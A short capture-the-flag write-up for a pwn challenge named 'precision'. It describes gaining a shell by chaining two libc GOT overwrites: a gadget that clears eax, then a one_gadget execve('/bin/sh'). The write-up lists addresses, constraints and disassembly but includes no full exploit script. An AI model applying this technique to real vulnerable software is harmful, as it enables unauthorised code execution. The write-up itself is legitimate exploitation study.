# pwn / precision

## IDEA

We have LIBC leak and ability to write 2 quadwords to LIBC memory.
libc.so.6 has partial RELRO, so we can overwrite GOT.
We can overwrite some GOT entries with one_gadget, but
we can't satisfy any one_gadget requirements (RAX == NULL for example).
To bypass this, we can chain two GOT overwrites to firstly jump
to some code that will clear RAX register and than call another function from GOT 
that we will overwrite with one_gadget.

So chain is:
	perror() -> 
	__strlen_avx2@got -> 
	xor eax, eax; call __tunable_get_val@got -> 
	__tunable_get_val@got -> 
	one_gagdet

The most difficult part is to find gadget that will clear RAX and then call 
another function from LIBC GOT.

## one_gadget

```
0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

## LIBC GOT

```
0x00007ffff7e19098│+0x0098: 0x00007ffff7d9d960  →  <__strlen_avx2+0000> endbr64 
...
0x00007ffff7e19178│+0x0178: 0x00007ffff7fdadd0  →  <__tunable_get_val+0000> endbr64 
```

## GOT GADGET

```
   97583:	31 c0                	xor    eax,eax
   97585:	48 89 e5             	mov    rbp,rsp
   97588:	48 89 ee             	mov    rsi,rbp
   9758b:	e8 c0 10 f9 ff       	call   28650 <__tunable_get_val@plt>
```
References:

- [https://tryhackme.com/room/HackfinityBattle](https://tryhackme.com/room/HackfinityBattle)
- [https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#1---targetting-libc-got-entries](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#1---targetting-libc-got-entries)
- [https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc#code-execution-inferno](https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc#code-execution-inferno)
